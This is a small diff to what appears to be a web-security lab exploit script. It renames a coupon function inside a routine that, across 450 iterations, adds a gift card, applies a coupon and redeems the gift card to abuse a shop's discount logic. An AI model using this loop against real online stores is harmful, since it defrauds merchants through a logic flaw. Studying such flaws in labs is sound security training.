@@ -53,7 +53,7 @@ def is_exploit_cart_sucessful(url, session):
             data=add_gift_card,
             verify=False)
 
-    def redeem_coupon():
+    def apply_coupon():
         cart_url = url + "/cart"
         redeem_coupon_url = url + "/cart/coupon"
         csrf_token = get_csrf_token(
@@ -99,7 +99,7 @@ def is_exploit_cart_sucessful(url, session):
 
     for counter in range(450):
         add_gift_card()
-        redeem_coupon()
+        apply_coupon()
         apply_gift_card()
     return counter == 449
 
